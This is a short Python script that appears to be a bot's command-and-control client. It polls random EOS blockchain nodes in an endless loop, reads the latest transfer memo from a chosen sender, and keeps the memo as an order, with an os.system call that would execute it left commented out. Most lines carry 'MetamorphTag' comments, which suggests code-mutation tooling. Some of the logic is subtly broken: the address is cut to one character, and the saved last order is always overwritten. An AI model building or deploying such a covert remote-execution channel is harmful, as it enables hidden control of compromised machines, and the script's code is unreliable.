import sys ## MetamorphTag
import os ## MetamorphTag
import time ## MetamorphTag
import pytz ## MetamorphTag
import json ## MetamorphTag
from eospy.cleos import Cleos ## MetamorphTag
from prettytable import PrettyTable ## MetamorphTag
import random ## MetamorphTag


import random

# Get random node 
def randnode():
    lines = open('nodes').read().splitlines()
    myline =random.choice(lines)
    return (myline)

# Get availiable node to use as a data channel ## MetamorphTag
def getworkingnode(): ## MetamorphTag
    return randnode()  ## MetamorphTag

## download orders from the block ## MetamorphTag
def execfromeos(options): ## MetamorphTag 
        try: ## MetamorphTag
            last = open("last.dat","r").readlines()[0]  ## MetamorphTag
        except: ## MetamorphTag
            pass ## MetamorphTag
            # start with improbable match
            last="0912391827398172368712381726384563563687216837612458781" ## MetamorphTag
        addr = options[0] ## MetamorphTag
       
        # improve with a list ## MetamorphTag
        ## conect to eos availiable node ## MetamorphTag
        try: ## MetamorphTag
            
            ce = Cleos(url=randnode()) ## MetamorphTag

            get_actions = ce.get_actions(addr) ## MetamorphTag
            will = get_actions["actions"][-1]["action_trace"]["act"]["data"]["memo"] ## MetamorphTag
            print(get_actions["actions"][-1]["action_trace"]["act"]["data"])
            
            if get_actions["actions"][-1]["action_trace"]["act"]["from"]==sys.argv[2] and will !=(str(last)) and will != "": ## MetamorphTag
                print(will) ## MetamorphTag
                #os.system(will) ## MetamorphTag
                open("last.dat","w").write(will) ## MetamorphTag
        except: ## MetamorphTag
            pass ## MetamorphTag


while True: ## MetamorphTag
    
    execfromeos(sys.argv[1]) ## MetamorphTag
    time.sleep(1) ## MetamorphTag
